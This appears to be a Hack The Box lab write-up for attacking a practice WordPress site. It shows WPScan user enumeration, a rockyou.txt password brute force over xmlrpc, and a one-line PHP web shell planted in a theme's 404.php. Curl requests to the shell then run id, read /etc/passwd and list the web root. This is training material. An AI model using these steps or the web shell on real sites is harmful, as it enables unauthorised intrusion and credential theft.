# Hack The Box - Attack WordPress (Writeup)

## Target Information
**IP Address**: 10.129.250.241

**Virtual Host (vhost)**: blog.inlanefreight.local

I edited my /etc/hosts file to map the IP address to the vhost:
```bash
sudo nano /etc/hosts
```
Added:
```bash
10.129.250.241 blog.inlanefreight.local
```
## Step 1: Enumerating the WordPress Site
To enumerate the WordPress installation, I used WPScan with an API token to find users:
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u --api-token CKFtS1LOO<SNIP>
```
**Identified Users**
- admin
- doug
```bash
<SNIP>
[i] User(s) Identified:

[+] by:
									admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] doug
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Sun Apr 27 23:34:41 2025
[+] Requests Done: 3632
[+] Cached Requests: 12
[+] Data Sent: 1.045 MB
[+] Data Received: 23.177 MB
[+] Memory used: 280.82 MB
[+] Elapsed time: 00:03:27
```
## Step 2: Bruteforcing Password for User "doug"
I attempted to bruteforce the password of the user doug using WPScan and the common password list rockyou.txt:
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
**Credentials found:**

- Username: doug
- Password: jessica1
```bash
[+] Performing password attack on Xmlrpc against 1 user/s
Trying doug / linkinpark Time: 00:00:16 <> (508 / 14344392)  0.00%  ETA: ??:??:?[SUCCESS] - doug / jessica1                                                     
Trying doug / cheyenne Time: 00:00:20 < > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: doug, Password: jessica1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Apr 27 23:44:30 2025
[+] Requests Done: 832
[+] Cached Requests: 8
[+] Data Sent: 402.909 KB
[+] Data Received: 907.688 KB
[+] Memory used: 271.418 MB
[+] Elapsed time: 00:00:38
```
## Step 3: Accessing WordPress Admin Panel
Using the obtained credentials, I logged into the WordPress admin dashboard:

- URL: http://blog.inlanefreight.local/wp-admin
- Username: doug
- Password: jessica1

![image](https://github.com/user-attachments/assets/d8ce93fc-6f93-4650-876d-704f7524eef5)

## Step 4: Gaining Remote Code Execution
Following the Attack WordPress module instructions, I modified the 404.php file of the Twenty Nineteen theme to execute system commands:
Navigated to
`Appearance -> Theme Editor -> 404.php (Twenty Nineteen Theme)`

Added the following PHP code:
`<?php system($_GET['cmd']); ?>`

![image](https://github.com/user-attachments/assets/3902f59e-b0b6-452a-8baf-77828a612f5b)

## Step 5: Testing Remote Command Execution
I tested the remote code execution by sending a curl request:
```bash
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=id"
```
Result:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![image](https://github.com/user-attachments/assets/4b0c1c18-2061-45fa-902e-7e15d76b01a6)

This confirmed that command execution was successfully achieved, and the code was running with www-data user privileges.

## Step 6: Exploring the Target System
To explore further I retrieved the contents of /etc/passwd:
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=cat+/etc/passwd
```
Found another user with a login shell /bin/bash (potential target for privilege escalation).

![image](https://github.com/user-attachments/assets/af902c4f-ab63-40c1-8ca6-d8604002954e)

I also listed files in the web server's root directory:
```bash
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=ls+/var/www/blog.inlanefreight.local/"
```
Found important files that will help in further privilege escalation or lateral movement to get the flag.

![image](https://github.com/user-attachments/assets/f9ac18b9-e2cf-408a-a41d-ef5fc8fc1f31)

## Summary

| Stage                | Status        |
|----------------------|---------------|
| WordPress user enumeration | ✅ Completed |
| Password brute forcing | ✅ Completed |
| Admin panel access | ✅ Completed |
| Remote Code Execution | ✅ Achieved |
| Initial foothold on the server | ✅ Done |


HAPPY HACKING !
